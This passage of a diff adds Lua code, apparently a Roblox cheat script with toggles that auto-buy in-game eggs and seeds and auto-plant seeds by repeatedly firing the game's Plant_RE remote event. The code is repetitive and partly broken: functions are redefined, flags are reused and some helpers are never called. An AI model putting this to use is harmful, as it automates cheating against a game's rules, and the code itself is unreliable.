+       legendaryegg = Value
+   end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy Mythical Egg (8,000,000¢)", 
+   CurrentValue = false,
+   Flag = "mythicalegg", 
+   Callback = function(Value)
+       mythicalegg = Value
+   end,
+})
+
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy Bug Egg (50,000,000¢)", 
+   CurrentValue = false,
+   Flag = "mythicalegg", 
+   Callback = function(Value)
+       bugegg = Value
+   end,
+})
+
+Section = Tab:CreateSection("Limited Shop AutoBuys")
+
+local Toggle = Tab:CreateToggle({
+   Name = "auto buy banana", 
+   CurrentValue = false,
+   Flag = "banana", 
+   Callback = function(Value)
+      if Value then
+          Notification("banana auto buy active!", 0.5, 255, 255, 0)
+         banana = true
+      elseif not Value then
+         banana = false
+      end
+   end,
+})
+
+local ToggleMysterious = Tab:CreateToggle({
+   Name = "auto buy Mysterious Crate (10,000,000¢)", 
+   CurrentValue = false,
+   Flag = "Mysterious Crate", 
+   Callback = function(Value)
+      if Value then
+         Notification("Mysterious Crate auto buy active!", 0.5, 255, 255, 0)
+         Mysterious = true
+      else
+         Mysterious = false
+      end
+   end,
+})
+
+local ToggleNightEgg = Tab:CreateToggle({
+   Name = "auto buy Night Egg (25,000,000¢)", 
+   CurrentValue = false,
+   Flag = "Night Egg", 
+   Callback = function(Value)
+      if Value then
+         Notification("Night Egg auto buy active!", 0.5, 255, 255, 0)
+         NightEgg = true
+      else
+         NightEgg = false
+      end
+   end,
+})
+
+local ToggleNightSeedPack = Tab:CreateToggle({
+   Name = "auto buy Night Seed Pack (25,000,000¢)", 
+   CurrentValue = false,
+   Flag = "Night Seed Pack", 
+   Callback = function(Value)
+      if Value then
+         Notification("Night Seed Pack auto buy active!", 0.5, 255, 255, 0)
+         NightSeedPack = true
+      else
+         NightSeedPack = false
+      end
+   end,
+})
+
+local ToggleBloodBanana = Tab:CreateToggle({
+   Name = "auto buy Blood Banana Seed (200,000¢)", 
+   CurrentValue = false,
+   Flag = "Blood Banana Seed", 
+   Callback = function(Value)
+      if Value then
+         Notification("Blood Banana Seed auto buy active!", 0.5, 255, 255, 0)
+         BloodBanana = true
+      else
+         BloodBanana = false
+      end
+   end,
+})
+
+local ToggleMoonMelon = Tab:CreateToggle({
+   Name = "auto buy Moon Melon Seed (500,000¢)", 
+   CurrentValue = false,
+   Flag = "Moon Melon Seed", 
+   Callback = function(Value)
+      if Value then
+         Notification("Moon Melon Seed auto buy active!", 0.5, 255, 255, 0)
+         MoonMelon = true
+      else
+         MoonMelon = false
+      end
+   end,
+})
+
+local ToggleStarCaller = Tab:CreateToggle({
+   Name = "auto buy Star Caller (12,000,000¢)", 
+   CurrentValue = false,
+   Flag = "Star Caller", 
+   Callback = function(Value)
+      if Value then
+         Notification("Star Caller auto buy active!", 0.5, 255, 255, 0)
+         StarCaller = true
+      else
+         StarCaller = false
+      end
+   end,
+})
+
+local ToggleBloodHedgehog = Tab:CreateToggle({
+   Name = "auto buy Blood Hedgehog (23,000,000¢)", 
+   CurrentValue = false,
+   Flag = "Blood Hedgehog", 
+   Callback = function(Value)
+      if Value then
+         Notification("Blood Hedgehog auto buy active!", 0.5, 255, 255, 0)
+         BloodHedgehog = true
+      else
+         BloodHedgehog = false
+      end
+   end,
+})
+
+local ToggleBloodKiwi = Tab:CreateToggle({
+   Name = "auto buy Blood Kiwi (20,000,000¢)", 
+   CurrentValue = false,
+   Flag = "Blood Kiwi", 
+   Callback = function(Value)
+      if Value then
+         Notification("Blood Kiwi auto buy active!", 0.5, 255, 255, 0)
+         BloodKiwi = true
+      else
+         BloodKiwi = false
+      end
+   end,
+})
+
+local ToggleBloodOwl = Tab:CreateToggle({
+   Name = "auto buy Blood Owl (30,000,000¢)", 
+   CurrentValue = false,
+   Flag = "Blood Owl", 
+   Callback = function(Value)
+      if Value then
+         Notification("Blood Owl auto buy active!", 0.5, 255, 255, 0)
+         BloodOwl = true
+      else
+         BloodOwl = false
+      end
+   end,
+})
+
+
+local APTab = Window:CreateTab("Auto Plant", 4483362458)
+
+
+Section = APTab:CreateSection("Only Use One Toggle At Once (beta rn)")
+
+
+local SingleSelectGroup = {}
+
+function SingleSelectGroup.new()
+    local self = {}
+    self.Toggles = {}
+
+    function self:AddToggle(toggle)
+        table.insert(self.Toggles, toggle)
+
+        local originalCallback = toggle.Callback or function() end
+
+        toggle:Set(false) -- Start off
+
+        toggle.Callback = function(state)
+            if state then
+                for _, t in ipairs(self.Toggles) do
+                    if t ~= toggle then
+                        t:Set(false)
+                    end
+                end
+            end
+            originalCallback(state)
+        end
+    end
+
+    return self
+end
+
+
+
+-- Variables
+local FarmFolder = workspace:WaitForChild("Farm")
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local AutoPlantEnabled = false
+local PlantingThread
+
+-- Functions from your script
+ function FindPlayersFarm(PlayersName)
+    for _, Descendant in ipairs(FarmFolder:GetDescendants()) do
+        if Descendant.Name == "Owner" and Descendant.Value == PlayersName then
+            return Descendant:FindFirstAncestor("Farm")
+        end
+    end
+end
+
+ function MakeStringSmaller(String, maxLength)
+    return string.sub(String, 1, math.min(#String, maxLength))
+end
+
+function HoldItem(ItemName)
+    local BackPack = LocalPlayer:FindFirstChild("Backpack")
+    local StringLength = #ItemName
+    for _, child in ipairs(BackPack:GetChildren()) do
+        local result = MakeStringSmaller(child.Name, StringLength)
+        if result == ItemName and not child:FindFirstChild("Item_Seed") then
+            child.Parent = LocalPlayer.Character
+            return true
+        end
+    end
+    for _, child in ipairs(LocalPlayer.Character:GetChildren()) do
+        local result = string.match(child.Name, "%a+")
+        if result == ItemName and not child:FindFirstChild("Item_Seed") then
+            child.Parent = LocalPlayer.Character
+            return true
+        end
+    end
+end
+ player = game.Players.LocalPlayer
+ mouse = player:GetMouse()
+
+ function startseedplacing(seedname, value)
+local locked = false 
+car = mouse.Button1Down:Connect(function()
+	if not locked then
+		locked = true
+        car:Disconnect()
+	end
+end)
+if value then
+part = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
+part.Size = Vector3.new(0.8, 1.65, 0.8)
+part.Anchored = true
+part.CanCollide = false
+part.Position = Vector3.new(0, 5, 0)
+part.Transparency = 0.5
+part.Parent = workspace
+end
+
+if not value then
+part:remove()
+    end
+
+rotation = 0
+
+
+while value do
+task.wait()
+HoldItem(seedname)
+local pos = part.Position
+
+    rotation = rotation + math.rad(1) -- 1 degree per frame
+    if rotation > math.pi * 2 then
+        rotation = 0
+    end
+
+if not locked then
+		mousePos = mouse.Hit.Position
+		part.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
+	else
+	currentPos = part.Position
+	part.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
+ game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
+	end
+    end
+end
+
+
+-- Toggle Logic
+APTab:CreateToggle({
+    Name = "Auto Plant Carrot Seed",
+    CurrentValue = false,
+    Flag = "AutoPlantCarrot",
+    Callback = function(Value)
+        AutoPlantEnabled = Value
+
+FruitGroup = SingleSelectGroup.new() -- One group for exclusive toggles
+
+        if Value then
+            PlantingThread = task.spawn(function()
+                    startseedplacing("Carrot", true)
+
+            end)
+        else
+ 
+            if PlantingThread then
+                startseedplacing("", false)
+                part:remove()
+                task.cancel(PlantingThread)
+            end
+        end
+    end
+})
+
+local function startseedplacing(seedname, value)
+local locked = false 
+car = mouse.Button1Down:Connect(function()
+	if not locked then
+		locked = true
+        car:Disconnect()
+	end
+end)
+
+if value then
+part2 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
+part2.Size = Vector3.new(0.8, 1.65, 0.8)
+part2.Anchored = true
+part2.CanCollide = false
+part2.Position = Vector3.new(0, 5, 0)
+part2.Transparency = 0.5
+part2.Parent = workspace
+end
+
+if not value then
+part2:remove()
+end
+
+rotation = 0
+
+
+while value do
+task.wait()
+HoldItem(seedname)
+local pos = part2.Position
+
+    rotation = rotation + math.rad(1) -- 1 degree per frame
+    if rotation > math.pi * 2 then
+        rotation = 0
+    end
+
+if not locked then
+		mousePos = mouse.Hit.Position
+		part2.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
+	else
+	currentPos = part2.Position
+	part2.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
+ game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
+	end
+    end
+end
+
+
+-- Toggle Logic
+APTab:CreateToggle({
+    Name = "Auto Plant Strawberry Seed",
+    CurrentValue = false,
+    Flag = "AutoPlantCarrot",
+    Callback = function(Value)
+        AutoPlantEnabled = Value
+
+FruitGroup = SingleSelectGroup.new() -- One group for exclusive toggles
+
+        if Value then
+            PlantingThread = task.spawn(function()
+                    startseedplacing("Strawberry", true)
+
+            end)
+        else
+            AutoPlantEnabled = false
+            if PlantingThread then
+                startseedplacing("", false)
+                task.cancel(PlantingThread)
+            end
+        end
+    end
+})
+
+local function startseedplacing(seedname, value)
+local locked = false 
+car = mouse.Button1Down:Connect(function()
+	if not locked then
+		locked = true
+        car:Disconnect()
+	end
+end)
+
+if value then
+part3 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
+part3.Size = Vector3.new(0.8, 1.65, 0.8)
+part3.Anchored = true
+part3.CanCollide = false
+part3.Position = Vector3.new(0, 5, 0)
+part3.Transparency = 0.5
+part3.Parent = workspace
+end
+
+if not value then
+part3:remove()
+end
+
+rotation = 0
+
+
+while value do
+task.wait()
+HoldItem(seedname)
+local pos = part3.Position
+
+    rotation = rotation + math.rad(1) -- 1 degree per frame
+    if rotation > math.pi * 2 then
+        rotation = 0
+    end
+
+if not locked then
+		mousePos = mouse.Hit.Position
+		part3.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
+	else
+	currentPos = part3.Position
+	part3.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
+ game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
+	end
+    end
+end
+
+
+-- Toggle Logic
+APTab:CreateToggle({
+    Name = "Auto Plant Blueberry Seed",
+    CurrentValue = false,
+    Flag = "AutoPlantCarrot",
+    Callback = function(Value)
+        AutoPlantEnabled = Value
+
+FruitGroup = SingleSelectGroup.new() -- One group for exclusive toggles
+
+        if Value then
+            PlantingThread = task.spawn(function()
+                    startseedplacing("Blueberry", true)
+
+            end)
+        else
+            AutoPlantEnabled = false
+            if PlantingThread then
+                startseedplacing("", false)
+                task.cancel(PlantingThread)
+            end
+        end
+    end
+})
+
+local function startseedplacing(seedname, value)
+local locked = false 
+car = mouse.Button1Down:Connect(function()
+	if not locked then
+		locked = true
+        car:Disconnect()
+	end
+end)
+
+if value then
+part4 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
+part4.Size = Vector3.new(0.8, 1.65, 0.8)
+part4.Anchored = true
+part4.CanCollide = false
+part4.Position = Vector3.new(0, 5, 0)
+part4.Transparency = 0.5
+part4.Parent = workspace
+end
+
+if not value then
+part4:remove()
+end
+
+rotation = 0
+
+
+while value do
+task.wait()
+HoldItem(seedname)
+local pos = part4.Position
+
+    rotation = rotation + math.rad(1) -- 1 degree per frame
+    if rotation > math.pi * 2 then
+        rotation = 0
+    end
+
+if not locked then
+		mousePos = mouse.Hit.Position
+		part4.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
+	else
+	currentPos = part4.Position
+	part4.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
+ game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
+	end
+    end
+end
+
+
+-- Toggle Logic
+APTab:CreateToggle({
+    Name = "Auto Plant Orange Tulip Seed",
+    CurrentValue = false,
+    Flag = "AutoPlantCarrot",
+    Callback = function(Value)
+        AutoPlantEnabled = Value
+
+FruitGroup = SingleSelectGroup.new() -- One group for exclusive toggles
+
+        if Value then
+            PlantingThread = task.spawn(function()
+                    startseedplacing("Orange Tulip", true)
+
+            end)
+        else
+            AutoPlantEnabled = false
+            if PlantingThread then
+                startseedplacing("", false)
+                task.cancel(PlantingThread)
+            end
+        end
+    end
+})
+
+local function startseedplacing(seedname, value)
+local locked = false 
+car = mouse.Button1Down:Connect(function()
+	if not locked then
+		locked = true
+        car:Disconnect()
+	end
+end)
+
+if value then
+part5 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
+part5.Size = Vector3.new(0.8, 1.65, 0.8)
+part5.Anchored = true
+part5.CanCollide = false
+part5.Position = Vector3.new(0, 5, 0)
+part5.Transparency = 0.5
+part5.Parent = workspace
+end
+
+if not value then
+part5:remove()
+end
+
+rotation = 0
+
+
+while value do
+task.wait()
+HoldItem(seedname)
+local pos = part5.Position
+
+    rotation = rotation + math.rad(1) -- 1 degree per frame
+    if rotation > math.pi * 2 then
+        rotation = 0
+    end
+
+if not locked then
+		mousePos = mouse.Hit.Position
+		part5.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
+	else
+	currentPos = part5.Position
+	part5.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
+ game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
+	end
+    end
+end
+
+
+-- Toggle Logic
+APTab:CreateToggle({
+    Name = "Auto Plant Tomato Seed",
+    CurrentValue = false,
+    Flag = "AutoPlantCarrot",
+    Callback = function(Value)
+        AutoPlantEnabled = Value
+
+
+        if Value then
+            PlantingThread = task.spawn(function()
+                    startseedplacing("Tomato", true)
+
+            end)
+        else
+            AutoPlantEnabled = false
+            if PlantingThread then
+                startseedplacing("", false)
+                task.cancel(PlantingThread)
+            end
+        end
+    end
+})
+
+local function startseedplacing(seedname, value)
+local locked = false 
+car = mouse.Button1Down:Connect(function()
+	if not locked then
+		locked = true
+        car:Disconnect()
+	end
+end)
+
+if value then
+part6 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
+part6.Size = Vector3.new(0.8, 1.65, 0.8)
+part6.Anchored = true
+part6.CanCollide = false
+part6.Position = Vector3.new(0, 5, 0)
+part6.Transparency = 0.5
+part6.Parent = workspace
+end
+
+if not value then
+part6:remove()
+end
+
+rotation = 0
+
+
+while value do
+task.wait()
+HoldItem(seedname)
+local pos = part6.Position
+
+    rotation = rotation + math.rad(1) -- 1 degree per frame
+    if rotation > math.pi * 2 then
+        rotation = 0
+    end
+
+if not locked then
+		mousePos = mouse.Hit.Position
+		part6.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
+	else
+	currentPos = part6.Position
+	part6.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
+ game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
+	end
+    end
+end
+
+
+-- Toggle Logic
+APTab:CreateToggle({
+    Name = "Auto Plant Corn Seed",
+    CurrentValue = false,
+    Flag = "AutoPlantCarrot",
+    Callback = function(Value)
+        AutoPlantEnabled = Value
+
+
+        if Value then
+            PlantingThread = task.spawn(function()
+                    startseedplacing("Corn", true)
+
+            end)
+        else
+            AutoPlantEnabled = false
+            if PlantingThread then
+                startseedplacing("", false)
+                task.cancel(PlantingThread)
+            end
+        end
+    end
+})
+
+local function startseedplacing(seedname, value)
+local locked = false 
+car = mouse.Button1Down:Connect(function()
+	if not locked then
+		locked = true
+        car:Disconnect()
+	end
+end)
+
+if value then
+part7 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
+part7.Size = Vector3.new(0.8, 1.65, 0.8)
+part7.Anchored = true
+part7.CanCollide = false
+part7.Position = Vector3.new(0, 5, 0)
+part7.Transparency = 0.5
+part7.Parent = workspace
+end
+
+if not value then
+part7:remove()
+end
+
+rotation = 0
+
+
+while value do
+task.wait()
+HoldItem(seedname)
+local pos = part7.Position
+
+    rotation = rotation + math.rad(1) -- 1 degree per frame
+    if rotation > math.pi * 2 then
+        rotation = 0
+    end
+
+if not locked then
+		mousePos = mouse.Hit.Position
+		part7.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
+	else
+	currentPos = part7.Position
+	part7.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
+ game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
+	end
+    end
+end
+
+
+-- Toggle Logic
+APTab:CreateToggle({
+    Name = "Auto Plant Daffodil Seed",
+    CurrentValue = false,
+    Flag = "AutoPlantCarrot",
+    Callback = function(Value)
+        AutoPlantEnabled = Value
+
+
+        if Value then
+            PlantingThread = task.spawn(function()
+                    startseedplacing("Daffodil", true)
+
+            end)
+        else
+            AutoPlantEnabled = false
+            if PlantingThread then
+                startseedplacing("", false)
+                task.cancel(PlantingThread)
+            end
+        end
+    end
+})
+
+local function startseedplacing(seedname, value)
+local locked = false 
+car = mouse.Button1Down:Connect(function()
+	if not locked then
+		locked = true
+        car:Disconnect()
+	end
+end)
+
+if value then
+part8 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
+part8.Size = Vector3.new(0.8, 1.65, 0.8)
+part8.Anchored = true
+part8.CanCollide = false
+part8.Position = Vector3.new(0, 5, 0)
+part8.Transparency = 0.5
+part8.Parent = workspace
+end
+
+if not value then
+part8:remove()
+end
+
+rotation = 0
+
+
+while value do
+task.wait()
+HoldItem(seedname)
+local pos = part8.Position
+
+    rotation = rotation + math.rad(1) -- 1 degree per frame
+    if rotation > math.pi * 2 then
+        rotation = 0
+    end
+
+if not locked then
+		mousePos = mouse.Hit.Position
+		part8.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
+	else
+	currentPos = part8.Position
+	part8.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
+ game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
+	end
+    end
+end
+
+
+-- Toggle Logic
+APTab:CreateToggle({
+    Name = "Auto Plant Watermelon Seed",
+    CurrentValue = false,
+    Flag = "AutoPlantCarrot",
+    Callback = function(Value)
+        AutoPlantEnabled = Value
+
+
+        if Value then
+            PlantingThread = task.spawn(function()
+                    startseedplacing("Watermelon", true)
+
+            end)
+        else
+            AutoPlantEnabled = false
+            if PlantingThread then
+                startseedplacing("", false)
+                task.cancel(PlantingThread)
+            end
+        end
+    end
+})
+
+local function startseedplacing(seedname, value)
+local locked = false 
+car = mouse.Button1Down:Connect(function()
+	if not locked then
+		locked = true
+        car:Disconnect()
+	end
+end)
+
+if value then
+part9 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
+part9.Size = Vector3.new(0.8, 1.65, 0.8)
+part9.Anchored = true
+part9.CanCollide = false
+part9.Position = Vector3.new(0, 5, 0)
+part9.Transparency = 0.5
+part9.Parent = workspace
+end
+
+if not value then
+part9:remove()
+end
+
+rotation = 0
+
+
+while value do
+task.wait()
+HoldItem(seedname)
+local pos = part9.Position
+
+    rotation = rotation + math.rad(1) -- 1 degree per frame
+    if rotation > math.pi * 2 then
+        rotation = 0
+    end
+
+if not locked then
+		mousePos = mouse.Hit.Position
+		part9.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
+	else
+	currentPos = part9.Position
+	part9.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
+ game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
+	end
+    end
+end
+
+
+-- Toggle Logic
+APTab:CreateToggle({
+    Name = "Auto Plant Pumpkin Seed",
+    CurrentValue = false,
+    Flag = "AutoPlantCarrot",
+    Callback = function(Value)
+        AutoPlantEnabled = Value
+
+
+        if Value then
+            PlantingThread = task.spawn(function()
+                    startseedplacing("Pumpkin", true)
+
+            end)
+        else
+            AutoPlantEnabled = false
+            if PlantingThread then
+                startseedplacing("", false)
+                task.cancel(PlantingThread)
+            end
+        end
+    end
+})
+
+local function startseedplacing(seedname, value)
+local locked = false 
+car = mouse.Button1Down:Connect(function()
+	if not locked then
+		locked = true
+        car:Disconnect()
+	end
+end)
+
+if value then
+part10 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
+part10.Size = Vector3.new(0.8, 1.65, 0.8)
+part10.Anchored = true
+part10.CanCollide = false
+part10.Position = Vector3.new(0, 5, 0)
+part10.Transparency = 0.5
+part10.Parent = workspace
+end
+
+if not value then
+part10:remove()
+end
+
+rotation = 0
+
+
+while value do
+task.wait()
+HoldItem(seedname)
+local pos = part10.Position
+
+    rotation = rotation + math.rad(1) -- 1 degree per frame
+    if rotation > math.pi * 2 then
+        rotation = 0
+    end
+
+if not locked then
+		mousePos = mouse.Hit.Position
+		part10.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
+	else
+	currentPos = part10.Position
+	part10.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
+ game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
+	end
+    end
+end
+
+
+-- Toggle Logic
+APTab:CreateToggle({
+    Name = "Auto Plant Apple Seed",
+    CurrentValue = false,
+    Flag = "AutoPlantCarrot",
+    Callback = function(Value)
+        AutoPlantEnabled = Value
+
+
+        if Value then
+            PlantingThread = task.spawn(function()
+                    startseedplacing("Apple", true)
+
+            end)
+        else
+            AutoPlantEnabled = false
+            if PlantingThread then
+                startseedplacing("", false)
+                task.cancel(PlantingThread)
+            end
+        end
+    end
+})
+
+local function startseedplacing(seedname, value)
+local locked = false 
+car = mouse.Button1Down:Connect(function()
+	if not locked then
+		locked = true
+        car:Disconnect()
+	end
+end)
+
+if value then
+part11 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
+part11.Size = Vector3.new(0.8, 1.65, 0.8)
+part11.Anchored = true
+part11.CanCollide = false
+part11.Position = Vector3.new(0, 5, 0)
+part11.Transparency = 0.5
+part11.Parent = workspace
+end
+
+if not value then
+part11:remove()
+end
+
+rotation = 0
+
+
+while value do
+task.wait()
+HoldItem(seedname)
+local pos = part11.Position
+
+    rotation = rotation + math.rad(1) -- 1 degree per frame
+    if rotation > math.pi * 2 then
+        rotation = 0
+    end
+
+if not locked then
+		mousePos = mouse.Hit.Position
+		part11.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
+	else
+	currentPos = part11.Position
+	part11.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
+ game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
+	end
+    end
+end
+
+
+-- Toggle Logic
+APTab:CreateToggle({
+    Name = "Auto Plant Bamboo Seed",
+    CurrentValue = false,
+    Flag = "AutoPlantCarrot",
+    Callback = function(Value)
+        AutoPlantEnabled = Value
+
+
+        if Value then
+            PlantingThread = task.spawn(function()
+                    startseedplacing("Bamboo", true)
+
+            end)
+        else
+            AutoPlantEnabled = false
+            if PlantingThread then
+                startseedplacing("", false)
+                task.cancel(PlantingThread)
+            end
+        end
+    end
+})
+
+local function startseedplacing(seedname, value)
+local locked = false 
+car = mouse.Button1Down:Connect(function()
+	if not locked then
+		locked = true
+        car:Disconnect()
+	end
+end)
+
+if value then
+part12 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
+part12.Size = Vector3.new(0.8, 1.65, 0.8)
+part12.Anchored = true
+part12.CanCollide = false
+part12.Position = Vector3.new(0, 5, 0)
+part12.Transparency = 0.5
+part12.Parent = workspace
+end
+
+if not value then
+part12:remove()
+end
+
+rotation = 0
+
+
+while value do
+task.wait()
+HoldItem(seedname)
+local pos = part12.Position
+
+    rotation = rotation + math.rad(1) -- 1 degree per frame
+    if rotation > math.pi * 2 then
+        rotation = 0
+    end
+
+if not locked then
+		mousePos = mouse.Hit.Position
+		part12.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
+	else
+	currentPos = part12.Position
+	part12.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
+ game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
+	end
+    end
+end
+
+
+-- Toggle Logic
+APTab:CreateToggle({
+    Name = "Auto Plant Coconut Seed",
+    CurrentValue = false,
+    Flag = "AutoPlantCarrot",
+    Callback = function(Value)
+        AutoPlantEnabled = Value
+
+
+        if Value then
+            PlantingThread = task.spawn(function()
+                    startseedplacing("Coconut", true)
+
+            end)
+        else
+            AutoPlantEnabled = false
+            if PlantingThread then
+                startseedplacing("", false)
+                task.cancel(PlantingThread)
+            end
+        end
+    end
+})
+
+local function startseedplacing13(seedname, value)
+	local locked = false 
+	local car = mouse.Button1Down:Connect(function()
+		if not locked then
+			locked = true
+			car:Disconnect()
+		end
+	end)
+
+	if value then
+		part13 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
+		part13.Size = Vector3.new(0.8, 1.65, 0.8)
+		part13.Anchored = true
+		part13.CanCollide = false
+		part13.Position = Vector3.new(0, 5, 0)
+		part13.Transparency = 0.5
+		part13.Parent = workspace
+	end
+
+	if not value and part13 then
+		part13:Destroy()
+	end
+
+	local rotation = 0
+	while value do
+		task.wait()
+		HoldItem(seedname)
+		local pos = part13.Position
+		rotation = rotation + math.rad(1)
+		if rotation > math.pi * 2 then rotation = 0 end
+
+		if not locked then
+			mousePos = mouse.Hit.Position
+			part13.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
+		else
+			currentPos = part13.Position
+			part13.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
+			game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
+		end
+	end
+end
+
+APTab:CreateToggle({
+    Name = "Auto Plant Cactus Seed",
+    CurrentValue = false,
+    Flag = "AutoPlantCarrot",
+    Callback = function(Value)
+        AutoPlantEnabled = Value
+
+
+        if Value then
+            PlantingThread = task.spawn(function()
+                    startseedplacing("Cactus", true)
+
+            end)
+        else
+            AutoPlantEnabled = false
+            if PlantingThread then
+                startseedplacing("", false)
+                task.cancel(PlantingThread)
+            end
+        end
+    end
+})
+
+-- part14
+local function startseedplacing14(seedname, value)
+	local locked = false 
+	local car = mouse.Button1Down:Connect(function()
+		if not locked then
+			locked = true
+			car:Disconnect()
+		end
+	end)
+
+	if value then
+		part14 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
+		part14.Size = Vector3.new(0.8, 1.65, 0.8)
+		part14.Anchored = true
+		part14.CanCollide = false
+		part14.Position = Vector3.new(0, 5, 0)
+		part14.Transparency = 0.5
+		part14.Parent = workspace
+	end
+
+	if not value and part14 then
+		part14:Destroy()
+	end
+
+	local rotation = 0
+	while value do
+		task.wait()
+		HoldItem(seedname)
+		local pos = part14.Position
+		rotation = rotation + math.rad(1)
+		if rotation > math.pi * 2 then rotation = 0 end
+
+		if not locked then
+			mousePos = mouse.Hit.Position
+			part14.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
+		else
+			currentPos = part14.Position
+			part14.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
+			game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
+		end
+	end
+end
+
+APTab:CreateToggle({
+    Name = "Auto Plant Dragon Fruit Seed",
+    CurrentValue = false,
+    Flag = "AutoPlantCarrot",
+    Callback = function(Value)
+        AutoPlantEnabled = Value
+
+
+        if Value then
+            PlantingThread = task.spawn(function()
+                    startseedplacing("Dragon Fruit", true)
+
+            end)
+        else
+            AutoPlantEnabled = false
+            if PlantingThread then
+                startseedplacing("", false)
+                task.cancel(PlantingThread)
+            end
+        end
+    end
+})
+
+-- part15
+local function startseedplacing15(seedname, value)
+	local locked = false 
+	local car = mouse.Button1Down:Connect(function()
+		if not locked then
+			locked = true
+			car:Disconnect()
+		end
+	end)
+
+	if value then
+		part15 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
+		part15.Size = Vector3.new(0.8, 1.65, 0.8)
+		part15.Anchored = true
+		part15.CanCollide = false
+		part15.Position = Vector3.new(0, 5, 0)
+		part15.Transparency = 0.5
+		part15.Parent = workspace
+	end
+
+	if not value and part15 then
+		part15:Destroy()
+	end
+
+	local rotation = 0
+	while value do
+		task.wait()
+		HoldItem(seedname)
+		local pos = part15.Position
+		rotation = rotation + math.rad(1)
+		if rotation > math.pi * 2 then rotation = 0 end
+
+		if not locked then
+			mousePos = mouse.Hit.Position
+			part15.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
+		else
+			currentPos = part15.Position
